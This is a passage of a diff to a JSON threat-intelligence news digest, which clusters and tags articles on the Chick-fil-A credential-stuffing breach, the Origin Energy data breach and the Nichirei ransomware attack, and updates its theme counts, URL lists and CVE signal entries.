least 21 clinics may have had medical records stolen in a cyberattack. News Briefs News Cybercrime Industry Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles James Reddick has worked as a journalist around the world, including in Lebanon and in Cambodia, where he was Deputy Managing Editor of The Phnom Penh Post. He is also a radio and podcast producer for outlets like Snap Judgment.",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "healthcare",
+            "financial_services",
+            "government",
+            "critical_infrastructure"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "The Record",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Major Australian energy supplier confirms customer data compromised",
+          "link": "https://therecord.media/australia-origin-energy-data-breach",
+          "published": "2026-07-23T13:20:00+00:00",
+          "summary": "Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.",
+          "taxonomy": {
+            "threat_categories": [
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "healthcare",
+              "financial_services",
+              "government",
+              "critical_infrastructure"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "d3be89f12a",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "credential_theft",
+          "data_breach"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "BleepingComputer",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Chick-fil-A data breach affects more than 13,000 customers",
+        "link": "https://www.bleepingcomputer.com/news/security/chick-fil-a-data-breach-affects-more-than-13-000-customers/",
+        "published": "2026-07-24T14:04:29+00:00",
+        "summary": "Chick-fil-A has confirmed that over 13,000 customers had their accounts breached in a wave of credential stuffing attacks targeting its website and mobile app between June 17 and June 19. [...]",
+        "full_body": "Chick-fil-A data breach affects more than 13,000 customers By Sergiu Gatlan July 24, 2026 10:04 AM 0 American fast food restaurant chain Chick-fil-A has confirmed that over 13,000 customers had their data stolen in a recent wave of credential stuffing attacks. As BleepingComputer first reported , the company revealed in data breach notification letters filed with multiple attorney general's offices that it detected attacks targeting its website and mobile app between June 17 and June 19 after identifying suspicious login activity to certain Chick-fil-A One accounts. Chick-fil-A says the attackers used automated tools and credentials \"obtained from a third-party source\" to hack into Chick-fil-A One accounts and steal customer data. \"We recently identified a security incident that may have affected a limited number of Chick-fil-A One Loyalty accounts. Upon discovering the issue, we took steps to immediately address, secure and restore accounts, and we are communicating directly with all customers who may have been impacted,\" the company told BleepingComputer. During the attacks, the threat actors accessed a combination of customers' names, email addresses, Chick-fil-A One membership numbers, the amount of Chick-fil-A credit, the mobile pay numbers, and the last four digits of the credit/debit card number. Additionally, they may have also gained access to birth dates, phone numbers, and addresses if stored in the compromised accounts. While the company didn't say how many individuals had their data exposed, Chick-fil-A notes in a filing shared by the Office of the Maine Attorney General with BleepingComputer on Wednesday that the resulting data breach affected 13,322 people in total. In separate filings, it also told the Texas attorney general's office the data breach impacts 2182 Texans and the Massachusetts AG that it affects 39 residents . Chick-fil-A has also sent data breach notification letters to residents of the District of Columbia, Iowa, Maryland, New Mexico, New York, North Carolina, Oregon, Vermont, and Rhode Island. In response to the incident, Chick-fil-A says it logged out all impacted accounts, removed payment methods, restored all affected Chick-fil-A One account balances, and has also added rewards to affected accounts as a way of apologizing. Since the accounts were compromised because they were using credentials stolen from third-party services, Chick-fil-A also advised impacted customers to change their passwords as soon as possible. Chick-fil-A also disclosed in March 2023 that hackers stole the personal information of over 71,000 customers after hacking their accounts in another series of credential stuffing attacks between December 2022 and February 2023. As one of the largest fast food companies in the United States, Chick-fil-A operates a network of over 3,000 restaurants across the U.S., Canada, Puerto Rico, the United Kingdom, and Singapore. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Chick-fil-A discloses data breach after credential stuffing attacks AssuranceAmerica data breach exposes records of 6.9 million drivers 23andMe to pay $18 million in new genetics data breach settlement Lidl discloses online shop breach after service provider hack DHS confirms hackers breached HSIN info-sharing platform",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "credential_theft",
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "BleepingComputer",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Chick-fil-A data breach affects more than 13,000 customers",
+          "link": "https://www.bleepingcomputer.com/news/security/chick-fil-a-data-breach-affects-more-than-13-000-customers/",
+          "published": "2026-07-24T14:04:29+00:00",
+          "summary": "Chick-fil-A has confirmed that over 13,000 customers had their accounts breached in a wave of credential stuffing attacks targeting its website and mobile app between June 17 and June 19. [...]",
+          "taxonomy": {
+            "threat_categories": [
+              "credential_theft",
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "c68e26f04e",
       "priority_score": 8,
       "member_count": 1,
@@ -6965,102 +6961,6 @@
               "government",
               "critical_infrastructure",
               "telecommunications"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "38eb29d9d7",
-      "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "critical_infrastructure",
-          "financial_services",
-          "government",
-          "healthcare"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "The Record",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Major Australian energy supplier confirms customer data compromised",
-        "link": "https://therecord.media/australia-origin-energy-data-breach",
-        "published": "2026-07-23T13:20:00+00:00",
-        "summary": "Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.",
-        "full_body": "A bird on barbed wire near electricity infrastructure in Adelaide, Australia. Image: Cameron Raynes via Unsplash Major Australian energy supplier confirms customer data compromised An Australian energy company serving nearly 5 million customers announced Thursday that it suffered a data breach and that it is working with federal agencies to investigate. On Wednesday, Sydney-based Origin Energy had said in a brief announcement that it was “investigating a potential security incident” after the news outlet The Australian reported that a purported hacker had sent what they claimed to be a sample of stolen records from the company. In a second update , Origin confirmed that customer data had been compromised and that it is “working to understand the total number of impacted customers.” The data may include account information, the last four digits of credit card numbers and last three digits of bank account numbers, as well as names, addresses and dates of birth. Origin CEO Frank Calabria apologized to customers. “One of our key priorities is taking action to secure our systems and ensure no further unauthorised access,” he said. “We are working with independent cyber experts to support Origin, and that work is continuing alongside the work of authorities.” The breach of Australia’s largest electricity and gas retailer follows the recent compromise of sensitive medical data belonging to a major Australian network of healthcare clinics. Partnered Health confirmed that patients who visited at least 21 clinics may have had medical records stolen in a cyberattack. News Briefs News Cybercrime Industry Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles James Reddick has worked as a journalist around the world, including in Lebanon and in Cambodia, where he was Deputy Managing Editor of The Phnom Penh Post. He is also a radio and podcast producer for outlets like Snap Judgment.",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "data_breach"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "healthcare",
-            "financial_services",
-            "government",
-            "critical_infrastructure"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "The Record",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Major Australian energy supplier confirms customer data compromised",
-          "link": "https://therecord.media/australia-origin-energy-data-breach",
-          "published": "2026-07-23T13:20:00+00:00",
-          "summary": "Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.",
-          "taxonomy": {
-            "threat_categories": [
-              "data_breach"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "healthcare",
-              "financial_services",
-              "government",
-              "critical_infrastructure"
             ],
             "affected_products": [],
             "tools_used": [],
@@ -7451,99 +7351,6 @@
       ]
     },
     {
-      "cluster_id": "b849eebcfc",
-      "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "ransomware_extortion",
-          "supply_chain"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services",
-          "manufacturing_industrial"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "Dark Reading",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain",
-        "link": "https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain",
-        "published": "2026-07-23T01:00:00+00:00",
-        "summary": "A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.",
-        "full_body": "Cyberattacks & Data Breaches Cybersecurity Operations ICS/OT Security Vulnerabilities & Threats News Breaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa, the Asia Pacific, Europe, and Latin America. Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken. Robert Lemos , Contributing Writer July 23, 2026 4 Min Read Source: Pack-Shot via Shutterstock Nichirei, a Japan-based frozen-food supplier and logistics firm, has largely recovered after a cyberattack disrupted its operations last week, resulting in curtailed shipments and leading Kentucky Fried Chicken franchises in the country to warn of shortages. Russia-linked ransomware group RansomHouse reportedly claimed credit for the breach earlier this week, posting some Nichirei data to the Dark Web. Nichirei acknowledged the breach but has only provided limited details on the actual events, which impacted its logistics and shipping operations. \"We are proceeding with business recovery after implementing security measures in collaboration with an external security firm,\" the company said in a July 22 Japanese-language statement (translated via Kagi Translate). \"Regarding the warehousing and frozen food shipping operations affected by the system failure, all locations are scheduled to transition to normal operations within this week.\" Related: Brazilian Banking Trojan Actively Spreading in Portugal The incident combines the top two threats affecting Japanese companies: ransomware and attacks targeting supply chains and subcontractors, according to an annual list published by the Information-technology Promotion Agency, part of Japan's Ministry of Economy, Trade, and Industry (METI). The cyber-risks surrounding the adoption of AI came in third — the first time that threat appeared on the list. In October 2025, Japanese beer giant Asahi suffered a ransomware attack that disrupted beer shipments for nearly two weeks , affected business operations for two months, and required until this February to completely rebuild systems and recover data. Nearly half of all Japanese companies (46%) have suffered a ransomware attack, according to a survey by the Japan Institute for the Promotion of Digital Economy and Community (JIPDEC). The National Police Agency (NPA) recorded 226 reports of ransomware attacks resulting in damage in 2025. Supply Chain Runs from Japan to KFC The attack on Nichirei had a direct impact on its approximately 5,000 customers, including Kentucky Fried Chicken, which warned last week that its franchises in Japan may have cut back hours. Nichirei manages a fleet of about 7,000 refrigerated vehicles from 141 different logistics centers and warehouses. The ripples of the ransomware attack demonstrate how a tightly knit supply chain can be dramatically affected by a cybersecurity event, says Collin Hogue-Spears, senior director of solution management at Black Duck, a software-security firm. \"Attackers compromised one company's servers, [and] Japan's procurement model spread that compromise across the national food supply,\" he says. Related: Ransomware Thugs Masquerade as Interpol to Entice Small Biz Companies need to practice ransomware recovery, he says. A good backup strategy is not enough if restoration takes weeks. If prevention requires severing the network, then the company has to be able to operate offline, says John Gallagher, vice president at Viakoo, a provider of automated IoT cyber hygiene. \"Nichirei's decision to sever internal networks is a classic response to active encryption or lateral movement across operational subnetworks,\" he says, adding: \"Japan's logistics ecosystem operates on hyper-efficient [just in time] delivery models with minimal buffer inventory. A 48-hour network freeze quickly leads to empt",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "supply_chain"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "financial_services",
-            "manufacturing_industrial"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Dark Reading",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain",
-          "link": "https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain",
-          "published": "2026-07-23T01:00:00+00:00",
-          "summary": "A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "supply_chain"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "financial_services",
-              "manufacturing_industrial"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "1258d35e57",
       "priority_score": 8,
       "member_count": 1,
@@ -7642,6 +7449,99 @@
             "role_map": {
               "Google/Gemini": "target"
             },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "b849eebcfc",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "ransomware_extortion",
+          "supply_chain"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Dark Reading",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain",
+        "link": "https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain",
+        "published": "2026-07-23T01:00:00+00:00",
+        "summary": "A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.",
+        "full_body": "Cyberattacks & Data Breaches Cybersecurity Operations ICS/OT Security Vulnerabilities & Threats News Breaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa, the Asia Pacific, Europe, and Latin America. Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken. Robert Lemos , Contributing Writer July 23, 2026 4 Min Read Source: Pack-Shot via Shutterstock Nichirei, a Japan-based frozen-food supplier and logistics firm, has largely recovered after a cyberattack disrupted its operations last week, resulting in curtailed shipments and leading Kentucky Fried Chicken franchises in the country to warn of shortages. Russia-linked ransomware group RansomHouse reportedly claimed credit for the breach earlier this week, posting some Nichirei data to the Dark Web. Nichirei acknowledged the breach but has only provided limited details on the actual events, which impacted its logistics and shipping operations. \"We are proceeding with business recovery after implementing security measures in collaboration with an external security firm,\" the company said in a July 22 Japanese-language statement (translated via Kagi Translate). \"Regarding the warehousing and frozen food shipping operations affected by the system failure, all locations are scheduled to transition to normal operations within this week.\" Related: Brazilian Banking Trojan Actively Spreading in Portugal The incident combines the top two threats affecting Japanese companies: ransomware and attacks targeting supply chains and subcontractors, according to an annual list published by the Information-technology Promotion Agency, part of Japan's Ministry of Economy, Trade, and Industry (METI). The cyber-risks surrounding the adoption of AI came in third — the first time that threat appeared on the list. In October 2025, Japanese beer giant Asahi suffered a ransomware attack that disrupted beer shipments for nearly two weeks , affected business operations for two months, and required until this February to completely rebuild systems and recover data. Nearly half of all Japanese companies (46%) have suffered a ransomware attack, according to a survey by the Japan Institute for the Promotion of Digital Economy and Community (JIPDEC). The National Police Agency (NPA) recorded 226 reports of ransomware attacks resulting in damage in 2025. Supply Chain Runs from Japan to KFC The attack on Nichirei had a direct impact on its approximately 5,000 customers, including Kentucky Fried Chicken, which warned last week that its franchises in Japan may have cut back hours. Nichirei manages a fleet of about 7,000 refrigerated vehicles from 141 different logistics centers and warehouses. The ripples of the ransomware attack demonstrate how a tightly knit supply chain can be dramatically affected by a cybersecurity event, says Collin Hogue-Spears, senior director of solution management at Black Duck, a software-security firm. \"Attackers compromised one company's servers, [and] Japan's procurement model spread that compromise across the national food supply,\" he says. Related: Ransomware Thugs Masquerade as Interpol to Entice Small Biz Companies need to practice ransomware recovery, he says. A good backup strategy is not enough if restoration takes weeks. If prevention requires severing the network, then the company has to be able to operate offline, says John Gallagher, vice president at Viakoo, a provider of automated IoT cyber hygiene. \"Nichirei's decision to sever internal networks is a classic response to active encryption or lateral movement across operational subnetworks,\" he says, adding: \"Japan's logistics ecosystem operates on hyper-efficient [just in time] delivery models with minimal buffer inventory. A 48-hour network freeze quickly leads to empt",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "supply_chain"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services",
+            "manufacturing_industrial"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Dark Reading",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain",
+          "link": "https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain",
+          "published": "2026-07-23T01:00:00+00:00",
+          "summary": "A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "supply_chain"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services",
+              "manufacturing_industrial"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -8065,8 +7965,8 @@
       "theme_key": "shinyhunters",
       "dominant_features": {
         "threat_categories": [
-          "phishing_social_eng",
           "ransomware_extortion",
+          "phishing_social_eng",
           "data_breach"
         ],
         "actor_attribution": [
@@ -8082,9 +7982,9 @@
           "poc_available"
         ]
       },
-      "cluster_count": 8,
-      "article_count": 7,
-      "cohesion": 0.325,
+      "cluster_count": 9,
+      "article_count": 8,
+      "cohesion": 0.345,
       "shared_strong_signals": [
         "ShinyHunters"
       ],
@@ -8097,6 +7997,7 @@
         "14625d1950",
         "17b63d385b",
         "7061b2c39d",
+        "07c378186b",
         "b788e3a84d",
         "5ef02eeb29",
         "86bb601c47",
@@ -8109,6 +8010,7 @@
         "https://thehackernews.com/2026/07/google-launches-gemini-35-flash-cyber.html",
         "https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html",
         "https://thehackernews.com/2026/07/critical-sharepoint-rce-cve-2026-50522.html",
+        "https://www.bleepingcomputer.com/news/security/shinyhunters-data-leaks-fuel-2-000-sextortion-email-scam/",
         "https://thehackernews.com/2026/07/critical-servicenow-ai-platform-flaw.html",
         "https://www.bleepingcomputer.com/news/security/ontrac-notifies-customers-of-data-breach-after-network-hack/",
         "https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365",
@@ -8190,7 +8092,7 @@
         ]
       },
       "cluster_count": 3,
-      "article_count": 12,
+      "article_count": 10,
       "cohesion": 0.294,
       "shared_strong_signals": [
         "WordPress"
@@ -8211,7 +8113,6 @@
         "https://horizon3.ai/attack-research/vulnerabilities/cve-2026-60137-cve-2026-63030/",
         "https://isc.sans.edu/diary/rss/33168",
         "https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend",
-        "https://www.reddit.com/r/netsec/comments/1v07npi/wp2shell_cve202663030_preauth_rce_chain_in/",
         "https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html",
         "https://www.darkreading.com/cyberattacks-data-breaches/wp2shell-millions-wordpress-sites-remote-takeover",
         "https://www.infosecurity-magazine.com/news/researchers-wordpress-exploit/",
@@ -8229,7 +8130,7 @@
         ]
       },
       "cluster_count": 3,
-      "article_count": 12,
+      "article_count": 11,
       "cohesion": 0.2,
       "shared_strong_signals": [
         "AWS"
@@ -8245,7 +8146,6 @@
         "https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching",
         "https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything",
         "https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence",
-        "https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/",
         "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
         "https://www.bleepingcomputer.com/news/security/fake-claude-app-promoted-by-bing-ads-pushes-sectoprat-malware/",
         "https://cyberscoop.com/white-house-accuses-moonshot-ai-anthropic-model-distillation/",
@@ -8338,7 +8238,7 @@
         ]
       },
       "cluster_count": 2,
-      "article_count": 9,
+      "article_count": 8,
       "cohesion": 0.2,
       "shared_strong_signals": [
         "Apple iOS/macOS"
@@ -8353,7 +8253,6 @@
         "https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching",
         "https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything",
         "https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence",
-        "https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/",
         "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
         "https://www.bleepingcomputer.com/news/security/fake-claude-app-promoted-by-bing-ads-pushes-sectoprat-malware/",
         "https://cyberscoop.com/white-house-accuses-moonshot-ai-anthropic-model-distillation/",
@@ -8422,47 +8321,27 @@
   ],
   "forward_signals": {
     "novelty": {
-      "cves": [
-        {
-          "value": "CVE-2026-16723",
-          "cluster_id": "e67ac609ab",
-          "first_source": "The Hacker News",
-          "first_published": "2026-07-25T12:52:43+00:00"
-        }
-      ],
+      "cves": [],
       "actors": [],
       "products": []
     },
     "velocity": [
-      {
-        "cluster_id": "56fb338f87",
-        "title": "WordPress Core Pre-Auth RCE Chain Exploited in the Wild",
-        "sources_in_window": 3,
-        "window_hours": 4.7,
-        "cohort_count": 6
-      },
       {
         "cluster_id": "8cda373323",
         "title": "OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure",
         "sources_in_window": 3,
         "window_hours": 3.9,
         "cohort_count": 5
-      }
-    ],
-    "leading_edge": [
+      },
       {
         "cluster_id": "56fb338f87",
         "title": "WordPress Core Pre-Auth RCE Chain Exploited in the Wild",
-        "lead_hours": 45.4,
-        "first_source": "Reddit r/netsec",
-        "later_tier1_source": "SANS Internet Storm Center",
-        "shared_signals": [
-          "CVE-2026-60137",
-          "CVE-2026-63030",
-          "OpenAI/ChatGPT",
-          "WordPress"
-        ]
-      },
+        "sources_in_window": 3,
+        "window_hours": 4.7,
+        "cohort_count": 5
+      }
+    ],
+    "leading_edge": [
       {
         "cluster_id": "8cda373323",
         "title": "OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure",
@@ -8472,20 +8351,6 @@
         "shared_signals": [
           "Linux kernel",
           "OpenAI/ChatGPT"
-        ]
-      },
-      {
-        "cluster_id": "3574a7b873",
-        "title": "TrendAI™ Adopts Claude Opus 5 to Advance Vulnerability Prioritization and Virtual Patching",
-        "lead_hours": 13.8,
-        "first_source": "Reddit r/netsec",
-        "later_tier1_source": "Trend Micro Research",
-        "shared_signals": [
-          "AWS",
-          "Anthropic/Claude",
-          "Apple iOS/macOS",
-          "CVE-2026-46331",
-          "Google Cloud"
         ]
       }
     ],
@@ -8508,21 +8373,6 @@
       {
         "cluster_id": "56fb338f87",
         "pair": "CVE-2026-63030 + WordPress",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "3574a7b873",
-        "pair": "CVE-2026-46331 + AWS",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "3574a7b873",
-        "pair": "CVE-2026-46331 + Apple iOS/macOS",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "3574a7b873",
-        "pair": "CVE-2026-46331 + Google Cloud",
         "first_observation": true
       },
       {
@@ -8563,6 +8413,21 @@
       {
         "cluster_id": "efa5d95ebc",
         "pair": "ShinyHunters + Microsoft Entra",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "c4020d76d0",
+        "pair": "CVE-2021-27137 + AWS",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "c4020d76d0",
+        "pair": "CVE-2021-27137 + WordPress",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "c4020d76d0",
+        "pair": "CVE-2026-0770 + AWS",
         "first_observation": true
       }
     ],
@@ -8683,12 +8548,6 @@
         "axis": "cve_ids",
         "value": "CVE-2026-50751",
         "cluster_id": "049863205d",
-        "weeks_observed": 3
-      },
-      {
-        "axis": "cve_ids",
-        "value": "CVE-2026-46331",
-        "cluster_id": "3574a7b873",
         "weeks_observed": 3
       },
       {
